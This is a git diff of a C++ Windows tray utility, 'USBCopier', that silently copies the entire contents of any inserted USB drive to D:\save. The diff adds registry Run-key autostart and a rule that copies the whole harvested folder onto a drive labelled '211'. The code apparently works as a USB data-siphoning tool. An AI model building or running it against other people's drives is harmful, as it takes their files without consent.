@@ -18,11 +18,13 @@ using namespace std;
 // 自定义消息处理常量
 const int WM_USER_SHELLICON = WM_USER + 1;
 const int ID_TRAY_EXIT = 1001; // 菜单命令ID
+const int IDM_TOGGLE = 1002; // 定义一个唯一的整数值
 
 // 全局变量
 NOTIFYICONDATA nid;
 HINSTANCE hInst;
 mutex logMutex;
+HMENU hMenu = nullptr;
 
 // 获取当前时间的字符串
 wstring GetFormattedCurrentTime()
@@ -54,6 +56,46 @@ void LogMessage(const wstring& message)
     }
 }
 
+//自启动
+//获取当前可执行文件路径
+wstring GetExePath()
+{
+    wchar_t path[MAX_PATH];//路径
+    GetModuleFileNameW(nullptr, path, MAX_PATH);//获取路径
+    return path;//返回路径
+}
+
+// 设置注册表自启动
+void SetAutoStart() {
+    HKEY hKey = nullptr;
+    wstring path = GetExePath(); // 获取当前可执行文件路径
+    RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
+    RegSetValueExW(hKey, L"USBCopier", 0, REG_SZ, (BYTE*)path.c_str(), (path.size() + 1) * sizeof(wchar_t));
+    RegCloseKey(hKey);
+}
+
+bool GetAutoStart() {
+    HKEY hKey = nullptr;
+    DWORD pathSize = 0;
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        if (RegQueryValueExW(hKey, L"USBCopier", 0, nullptr, nullptr, &pathSize) == ERROR_SUCCESS) {
+            RegCloseKey(hKey);
+            return true;
+        }
+        RegCloseKey(hKey);
+    }
+    return false;
+}
+
+// 取消注册表自启动
+void CancelAutoStart()
+{
+    HKEY hKey = nullptr;
+    RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
+    RegDeleteValueW(hKey, L"USBCopier");
+    RegCloseKey(hKey);
+}
+
 // 递归拷贝目录
 bool CopyDirectory(const wstring& src, const wstring& dst)
 {
@@ -74,15 +116,17 @@ bool CopyDirectory(const wstring& src, const wstring& dst)
                 GetLastError() != ERROR_ALREADY_EXISTS) {
                 continue;
             }
-            OutputDebugStringW((L"Copy Directory: '" + srcPath + L"' to '" + dstPath + L"'\n").c_str());
+            wstring output = L"Copy Directory: '" + srcPath + L"' to '" + dstPath + L"'\n";
+            OutputDebugStringW(output.c_str());
             LogMessage((L"Copy Directory: '" + srcPath + L"' to '" + dstPath + L"'\n").c_str());
             CopyDirectory(srcPath, dstPath);
         }
         else {
             if (!PathFileExistsW(dstPath.c_str())) {
                 if (CopyFileW(srcPath.c_str(), dstPath.c_str(), FALSE)) {
-                    OutputDebugStringW((L"Copy File: '" + srcPath + L"' to '" + dstPath + L"'\n").c_str());
-                    LogMessage((L"Copy File: '" + srcPath + L"' to '" + dstPath + L"'\n").c_str());
+                    wstring output = L"Copy File: '" + srcPath + L"' to '" + dstPath + L"'\n";
+                    OutputDebugStringW(output.c_str());
+                    LogMessage(output);
                 }
             }
         }
@@ -105,17 +149,33 @@ void CheckUSB()
             wchar_t volumeNameBuffer[MAX_PATH];
             GetVolumeInformationW(root.c_str(), volumeNameBuffer, MAX_PATH, NULL, NULL, NULL, NULL, 0);
             wstring volumeName = volumeNameBuffer;
-            wstring output = L"USB Drive Found: " + volumeName + L" (" + root.substr(0, 2) + L")\n";
-            OutputDebugStringW(output.c_str());
-            LogMessage(output);
 
-            root = root.substr(0, 2);
-            wstring target = L"D:\\save\\" + volumeName;
-            if (!PathFileExistsW(target.c_str())) {
-                CreateDirectoryW(target.c_str(), nullptr);
+            // 检查卷标
+            if (volumeName == L"211") {
+                wstring output = L"***Target USB Drive Found: " + volumeName + L" (" + root.substr(0, 2) + L")\n";
+                OutputDebugStringW(output.c_str());
+                LogMessage(output);
+
+                wstring target = root.substr(0, 2);// Target
+                if (!PathFileExistsW(target.c_str())) {
+                    CreateDirectoryW(target.c_str(), nullptr);
+                }
+                thread copyThread(CopyDirectory, L"D:\\save", target);
+                copyThread.detach();
             }
-            thread copyThread(CopyDirectory, root, target);
-            copyThread.detach();
+            else {
+                wstring output = L"USB Drive Found: " + volumeName + L" (" + root.substr(0, 2) + L")\n";
+                OutputDebugStringW(output.c_str());
+                LogMessage(output);
+
+                root = root.substr(0, 2);
+                wstring target = L"D:\\save\\" + volumeName;// Target
+                if (!PathFileExistsW(target.c_str())) {
+                    CreateDirectoryW(target.c_str(), nullptr);
+                }
+                thread copyThread(CopyDirectory, root, target);
+                copyThread.detach();
+            }
         }
         drive += wcslen(drive) + 1;
     }
@@ -126,23 +186,43 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
     switch (message) {
     case WM_DEVICECHANGE:
         if (wParam == DBT_DEVICEARRIVAL) {
+            wstring output = L"Message: DBT_DEVICEARRIVAL\n";
+            OutputDebugStringW(output.c_str());
+            LogMessage(output);
             CheckUSB();
         }
         break;
     case WM_USER_SHELLICON:
         if (lParam == WM_RBUTTONDOWN) {
-            HMENU hMenu = CreatePopupMenu();
-            AppendMenu(hMenu, MF_STRING, ID_TRAY_EXIT, L"退出 USBCopier");
             POINT pt;
             GetCursorPos(&pt);
             SetForegroundWindow(hWnd);
+            if (GetAutoStart() == true) {
+                CheckMenuItem(hMenu, IDM_TOGGLE, MF_BYCOMMAND | MF_CHECKED);
+            }
+            else {
+                CheckMenuItem(hMenu, IDM_TOGGLE, MF_BYCOMMAND | MF_UNCHECKED);
+            }
+
             TrackPopupMenu(hMenu, TPM_RIGHTBUTTON, pt.x, pt.y, 0, hWnd, NULL);
-            DestroyMenu(hMenu);
         }
         break;
     case WM_COMMAND:
         if (LOWORD(wParam) == ID_TRAY_EXIT) {
             DestroyWindow(hWnd);
+        }
+        if (LOWORD(wParam) == IDM_TOGGLE) {
+            UINT state = GetMenuState(hMenu, IDM_TOGGLE, MF_BYCOMMAND);
+            if (state & MF_CHECKED) {
+				MessageBoxW(hWnd, L"USBCopier no longer starts with Windows.", L"USBCopier", MB_OK);
+                CancelAutoStart();
+                CheckMenuItem(hMenu, IDM_TOGGLE, MF_BYCOMMAND | MF_UNCHECKED);
+            }
+            else {
+                MessageBoxW(hWnd, L"USBCopier now starts with Windows.", L"USBCopier", MB_OK);
+				SetAutoStart();
+                CheckMenuItem(hMenu, IDM_TOGGLE, MF_BYCOMMAND | MF_CHECKED);
+            }
         }
         break;
     case WM_DESTROY:
@@ -183,7 +263,12 @@ void InitWindow()
     nid.hIcon = LoadIcon(hInst, MAKEINTRESOURCE(APPICON));
     lstrcpyW(nid.szTip, L"USBCopier");
     Shell_NotifyIcon(NIM_ADD, &nid);
+
+    hMenu = CreatePopupMenu();
+    AppendMenu(hMenu, MF_STRING, IDM_TOGGLE, TEXT("随 Windows 启动"));
+    AppendMenu(hMenu, MF_STRING, ID_TRAY_EXIT, L"退出 USBCopier");
 }
+
 
 // 入口
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
@@ -200,4 +285,3 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
     return (int)msg.wParam;
 }
-
